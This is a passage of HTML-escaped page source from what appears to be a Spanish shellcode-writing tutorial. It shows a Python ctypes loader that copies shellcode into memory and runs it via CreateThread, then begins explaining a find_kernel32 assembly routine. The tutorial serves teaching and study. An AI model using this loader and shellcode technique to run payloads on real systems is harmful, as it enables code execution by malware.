&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;windll&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;kernel32&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;RtlMoveMemory&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ptr&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;buf&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;len&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;Shellcode located at address &lt;span class=&quot;z-constant z-other z-placeholder z-python&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;%&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;hex&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ptr&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;input&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;...ENTER TO EXECUTE SHELLCODE...&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ht&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;windll&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;kernel32&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;CreateThread&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;0&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;0&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ptr&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;0&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;0&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;pointer&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;0&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;windll&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;kernel32&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;WaitForSingleObject&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ht&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;-&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Nuestro shellcode inicia con &lt;code&gt;int3&lt;&#x2F;code&gt;, que es un punto de interrupción para facilitar la depuración.&lt;&#x2F;p&gt;
&lt;p&gt;Después movemos &lt;code&gt;esp&lt;&#x2F;code&gt; a &lt;code&gt;ebp&lt;&#x2F;code&gt; y reservamos un tamaño de &lt;code&gt;0x60&lt;&#x2F;code&gt; en &lt;code&gt;esp&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Esto emula una llamada a una función real en la que el registro ESP se mueve al registro EBP para facilitar el acceso a lso argumentos pasados por la función. Restamos un desplazamiento arbitrario para que la pila no se sature.&lt;&#x2F;p&gt;
&lt;p&gt;Se define la funcón &lt;code&gt;find_kernel32&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_kernel32:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor ecx, ecx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;          &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; null
